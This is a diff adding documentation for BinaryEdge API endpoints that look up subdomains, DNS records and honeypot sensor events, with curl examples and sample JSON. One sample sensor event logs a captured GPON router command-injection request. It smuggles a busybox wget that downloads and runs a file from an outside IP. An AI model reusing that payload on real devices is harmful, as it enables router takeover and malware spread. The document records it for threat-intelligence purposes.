@@ -1013,3 +1013,360 @@ Example:
      ]
 }
 ```
+
+### NEW
+
+### Domains
+
+What is exposed via DNS? What subdomains belong to a Domain? What domains are served by IP X?
+
+#### /v1/query/domains/subdomain/{target}
+
+Return list of subdomains known from the target domains
+
+*Parameters*
+
+* target: [String] Domain you want to get list of known subdomains.
+* page: [Int] Optional. Default 1, Maximum: 500 (10,000 results)
+
+*Output*
+
+```shell
+curl 'https://api.binaryedge.io/v1/query/domains/subdomain/example.com' -H 'X-Token:API_KEY'
+```
+
+```json
+{
+  "query": "root:example.com",
+  "page": 1,
+  "pagesize": 100,
+  "total": 6308,
+  "events": ["m.example.com", "startup.antichat.example.com", "anandop1.example.com", "vladimirbezz3.example.com"]
+}
+```
+
+#### /v1/query/domains/dns/{target}
+
+Return list of known DNS results for the target domain.
+
+Possible types of records currently available:
+
+* A
+* AAAA
+* NS
+* MX
+
+**Note**: Available for paid subscriptions only.
+
+*Parameters*
+
+* target: [String] Domain you want to get DNS related data.
+* page: [Int] Optional. Default 1
+
+*Output*
+
+```shell
+curl 'https://api.binaryedge.io/v1/query/domains/dns/example.com' -H 'X-Token:API_KEY'
+```
+
+```json
+{
+  "query": "root:example.com",
+  "page": 1,
+  "pagesize": 100,
+  "total": 6308,
+  "events": [{
+    "A": ["92.63.97.42"],
+    "updated_at": "2018-09-22T04:53:21.082802",
+    "domain": "startup.antichat.example.com",
+    "root": "example.com"
+  }, {
+    "A": ["93.184.216.34"],
+    "MX": ["example.com"],
+    "NS": ["ns1.example.com", "ns2.example.com"],
+    "updated_at": "2018-12-10T13:20:16.854174",
+    "domain": "example.com",
+    "root": "example.com",
+  }, {
+    "A": ["91.235.136.112"],
+    "updated_at": "2018-09-22T04:14:29.031596",
+    "domain": "vladimirbezz3.example.com",
+    "root": "example.com"
+  }, {
+    "A": ["93.179.68.6"],
+    "updated_at": "2018-09-22T03:51:36.852124",
+    "domain": "i.seeva.example.com",
+    "root": "example.com"
+  }]
+}
+```
+
+#### /v1/query/domains/ip/{target}
+
+Return records that have the specified IP address in their A or AAAA records.
+
+**Note**: Available for paid subscriptions only.
+
+*Parameters*
+
+* target: [IP] IP you want to verify, can be IPV4 or IPV6
+* page: [Int] Optional. Default 1, Maximum: 500 (10,000 results)
+
+*Output*
+
+```shell
+curl 'https://api.binaryedge.io/v1/query/domains/ip/8.8.8.8' -H 'X-Token:API_KEY'
+```
+
+```json
+{
+  "query": "A:\"8.8.8.8\"",
+  "page": 1,
+  "pagesize": 100,
+  "total": 726,
+  "events": [{
+    "A": ["8.8.8.8"],
+    "updated_at": "2018-06-08T20:51:30.676063",
+    "NS": ["ns1058.ui-dns.org", "ns1062.ui-dns.com", "ns1068.ui-dns.biz", "ns1096.ui-dns.de"],
+    "domain": "aeroway.co.uk",
+    "root": "aeroway.co.uk",
+    "MX": ["mx00.1and1.co.uk", "mx01.1and1.co.uk"]
+  }, {
+    "A": ["8.8.8.8"],
+    "updated_at": "2018-06-08T20:53:30.348620",
+    "NS": ["f1g1ns1.dnspod.net", "f1g1ns2.dnspod.net"],
+    "domain": "84168800.com",
+    "root": "84168800.com"
+  }, {
+    "A": ["8.8.8.8"],
+    "updated_at": "2018-06-08T20:53:32.450310",
+    "NS": ["f1g1ns1.dnspod.net", "f1g1ns2.dnspod.net"],
+    "domain": "84169911.com",
+    "root": "84169911.com"
+  }, {
+    "A": ["8.8.8.8"],
+    "updated_at": "2018-06-08T20:53:32.508761",
+    "NS": ["f1g1ns1.dnspod.net", "f1g1ns2.dnspod.net"],
+    "domain": "84163311.com",
+    "root": "84163311.com"
+  }, {
+    "A": ["8.8.8.8"],
+    "updated_at": "2018-06-08T20:53:32.540496",
+    "NS": ["f1g1ns1.dnspod.net", "f1g1ns2.dnspod.net"],
+    "domain": "00888416.com",
+    "root": "00888416.com"
+  }]
+}
+```
+
+#### /v1/query/domains/search
+
+List of Domains/DNS data based on a Query.  Can be used with specific parameters and/or full-text search. Possible types of records currently available:
+
+* A
+* AAAA
+* NS
+* MX
+* CNAME
+* TXT
+
+*Parameters*
+
+* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events.
+* page: [Int] Optional. Default 1, Maximum: 500 (10,000 results)
+
+*Output*
+
+```shell
+curl 'https://api.binaryedge.io/v1/query/domains/search?query=A:127.0.01' -H 'X-Token:API_KEY'
+```
+
+```json
+{
+  "query": "A:127.0.0.1",
+  "page": 1,
+  "pagesize": 100,
+  "total": 176685,
+  "events": [{
+    "A": ["127.0.0.1"],
+    "updated_at": "2018-06-08T20:32:57.002881",
+    "NS": ["ns3jkl.name.com", "ns4qxz.name.com", "ns2knz.name.com", "ns1ksz.name.com"],
+    "domain": "heathynurseway.co.uk",
+    "root": "heathynurseway.co.uk",
+    "MX": ["mail.emailgoodbye.me"]
+  }, {
+    "A": ["127.0.0.1"],
+    "updated_at": "2018-06-08T20:29:19.612334",
+    "NS": ["ns1.antagus.de", "ns2.antagus.de"],
+    "domain": "vit.press",
+    "root": "vit.press",
+    "MX": ["mail.vit.press"]
+  },
+  (...)
+  ]
+}
+```
+
+### Sensors
+
+#### /v1/query/sensors/ip/{target}
+
+Details about an Scanner. List of recent events form the specified host, including details of scanned ports, payloads and tags.
+
+**Note**: Querying CIDRs is available for paid subscriptions only. When using CIDR, the number of credits that will be spent correspond to the number of targets that returned results. Example: a request for a /24 (256 targets) in which only 200 targets have results, will decrement 200 credits.
+
+*Parameters*
+
+* target: [String] target IP address or CIDR up to /24
+
+*Output*
+
+```shell
+curl 'https://api.binaryedge.io/v1/query/sensors/ip/xxx.xxx.xxx.xxx' -H 'X-Token:API_KEY'
+```
+
+```json
+{
+    "query": "xxx.xxx.xxx.xxx",
+    "total": 1,
+    "targets_found": 1,
+    "events": [{
+        "port": 443,
+        "results": [{
+            "target": {
+                "port": 443,
+                "protocol": "tcp"
+            },
+            "origin": {
+                "ts": 1549500839739,
+                "type": "sinkhole",
+                "ip": "xxx.xxx.xxx.xxx",
+                "rdns": "xxx.xxx.xxx.example.com"
+            },
+            "data": {
+                "payload": "POST /GponForm/diag_Form?style/ HTTP/1.1\\r\\nUser-Agent: Hello, World\\r\\nAccept: */*\\r\\nAccept-Encoding: gzip, deflate\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://185.244.25.98/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0",
+                "extra": {
+                    "http": {
+                        "method": "POST",
+                        "path": "/GponForm/diag_Form?style/",
+                        "version": "1.1",
+                        "headers": {
+                            "user-agent": "Hello, World",
+                            "accept": "*/*",
+                            "accept-encoding": "gzip, deflate",
+                            "content-type": "application/x-www-form-urlencoded"
+                        }
+                    }
+                },
+                "tags": ["HTTP_SCANNER"]
+            },
+            "@timestamp": "2019-02-07T00:54:00.422Z"
+        }]
+    }]
+}
+```
+
+#### /v1/query/sensors/search
+
+Events based on a Query. List of recent events for the given query, including details of scanned ports, payloads and tags. Can be used with specific parameters and/or full-text search.
+
+*Parameters*
+
+* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](sensors-search.md) for details on what parameters can be used.
+* page: [Int] Optional. Default 1, Maximum: 500 (10,000 results)
+
+*Output*
+
+```shell
+curl 'https://api.binaryedge.io/v1/query/sensors/search?query=tags:ssh_scanner' -H 'X-Token:API_KEY'
+```
+
+```json
+{
+    "query": "tags:ssh_scanner",
+    "page": 1,
+    "pagesize": 20,
+    "total": 1117979,
+    "events": [{
+        "data": {
+            "payload": "SSH-2.0-PUTTY\\r\\n",
+            "extra": {
+                "ssh": {
+                    "description": "SSH-2.0-PUTTY"
+                }
+            },
+            "tags": ["SSH_SCANNER"]
+        },
+        "target": {
+            "port": 22,
+            "protocol": "tcp"
+        },
+        "origin": {
+            "ip": "218.92.1.153",
+            "type": "sinkhole",
+            "ts": 1549625590653,
+            "asn": 4134
+        }
+    }, {
+        "target": {
+            "port": 22,
+            "protocol": "tcp"
+        },
+        "data": {
+            "payload": "\\x00\\x00\\x02\\x84\\x07\\x14t\\x85\\x97.Sf\\x88\\xa3\\x1a\\x7f\\xf7:ZzG\\\\\\x00\\x00\\x00Ydiffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1\\x00\\x00\\x00\\x0fssh-rsa,ssh-dss\\x00\\x00\\x00\\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\\x00\\x00\\x00\\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\\x00\\x00\\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\\x00\\x00\\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\\x00\\x00\\x00\\x04none\\x00\\x00\\x00\\x04none\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00=@\\x8d71\\xc9&",
+            "extra": {
+                "ssh": {
+                    "hassh": "92674389fa1e47a27ddd8d9b63ecd42b",
+                    "hassh_algorithms": "diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc;hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com;none"
+                }
+            },
+            "tags": ["SSH_SCANNER"]
+        },
+        "origin": {
+            "ip": "58.242.83.31",
+            "type": "sinkhole",
+            "ts": 1549625585310,
+            "asn": 4837
+        }
+    },
+    {...}
+    ]
+}
+```
+
+#### /v1/query/sensors/search/stats
+
+Statistics of events for the given query. Can be used with specific parameters and/or full-text search.
+
+*Parameters*
+
+* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](sensors-search.md) for details on what parameters can be used.
+* type: [String] Type of statistic we want to obtain. Possible types include:
+    * _ports_, _tags_, _countries_, _asn_, _ips_, _payloads_, _http\_path_.
+* days: [Integer] Number of days to get the stats for. For example days=1 for the last day of data.
+    * Max: 60 (default)
+
+*Output*
+
+```shell
+curl 'https://api.binaryedge.io/v1/query/sensors/search/stats?query=tags:ssh_scanner&type=ports' -H 'X-Token:API_KEY'
+```
+
+```json
+[{
+    "key": "22/tcp",
+    "doc_count": 1102752
+}, {
+    "key": "2222/tcp",
+    "doc_count": 8149
+}, {
+    "key": "222/tcp",
+    "doc_count": 1970
+}, {
+    "key": "4000/tcp",
+    "doc_count": 1962
+}, {
+    "key": "23/tcp",
+    "doc_count": 1552
+}]
+```
